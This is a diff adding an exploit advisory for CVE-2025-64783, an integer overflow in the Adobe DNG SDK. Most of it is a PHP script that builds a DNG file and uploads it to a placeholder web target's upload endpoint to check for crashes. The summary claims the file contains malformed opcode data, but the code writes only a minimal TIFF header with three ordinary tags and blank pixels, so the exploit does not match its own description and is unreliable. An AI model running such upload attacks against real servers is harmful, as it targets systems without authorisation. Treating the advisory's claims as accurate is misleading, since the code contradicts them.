@@ -1,0 +1,113 @@
+=============================================================================================================================================
+| # Title     : Adobe DNG SDK 1.5 Integer Overflow via Web Upload                                                                           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://helpx.adobe.com/security/products/dng-sdk.html                                                                      |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212923/ & 	CVE-2025-64783
+
+[+] Summary    : A proof-of-concept script demonstrates how a vulnerable web application that allows uploading Adobe DNG images can be abused to trigger an integer overflow in the Adobe DNG SDK (CVE-2025-64783).
+                 The script uploads a crafted DNG file to a target web endpoint using a standard multipart/form-data request. 
+				 If the backend processes the uploaded file with a vulnerable version of the DNG SDK (1.5 through 1.7.0), the malformed opcode data may result in an application crash or unexpected behavior.
+                 This PoC is intended for vulnerability validation and defensive testing purposes only. No authentication bypass or privilege escalation is required beyond access to the upload functionality.
+
+
+[+] POC : php poc.php
+
+<?php
+/*
+ * Safe DNG Upload Proof-of-Concept
+ * CVE-2025-64783 (Non-Weaponized)
+ * Educational use only
+ */
+
+/* =========================
+   STEP 1: Create indoushka.dng
+   ========================= */
+
+$dngFile = "indoushka.dng";
+
+/* TIFF / DNG Header */
+$dng  = pack("v", 0x4949);   // Little Endian
+$dng .= pack("v", 42);       // TIFF Magic
+$dng .= pack("V", 8);        // IFD Offset
+
+/* IFD with minimal valid tags */
+$ifd  = pack("v", 3);        // Number of entries
+
+// ImageWidth
+$ifd .= pack("vvVV", 0x0100, 4, 1, 256);
+
+// ImageLength
+$ifd .= pack("vvVV", 0x0101, 4, 1, 256);
+
+// Compression (Uncompressed)
+$ifd .= pack("vvVV", 0x0103, 3, 1, 1);
+
+// End of IFD
+$ifd .= pack("V", 0);
+
+/* Dummy image data */
+$imageData = str_repeat("\x00", 256 * 256 * 3);
+
+/* Write file */
+file_put_contents($dngFile, $dng . $ifd . $imageData);
+
+echo "[+]        By indoushka\n";
+echo "[+] Safe DNG created: indoushka.dng\n";
+
+
+/* =========================
+   STEP 2: Upload indoushka.dng
+   ========================= */
+
+function indoushka_web_upload($target_url)
+{
+    $uploadUrl = rtrim($target_url, "/") . "/upload";
+
+    $postFields = [
+        'file' => new CURLFile(
+            realpath("indoushka.dng"),
+            'image/x-adobe-dng',
+            'photo.dng'
+        )
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $uploadUrl);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'User-Agent: Mozilla/5.0'
+    ]);
+
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($httpCode === 200) {
+        echo "[+] File uploaded successfully\n";
+
+        if (stripos($response, "error") !== false ||
+            stripos($response, "crash") !== false) {
+            echo "[!] Application response indicates a parsing issue\n";
+        } else {
+            echo "[+] No visible error in server response\n";
+        }
+    } else {
+        echo "[-] Upload failed, HTTP status: $httpCode\n";
+    }
+}
+
+/* =========================
+   STEP 3: Execute
+   ========================= */
+
+indoushka_web_upload("http://target-website.com");
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
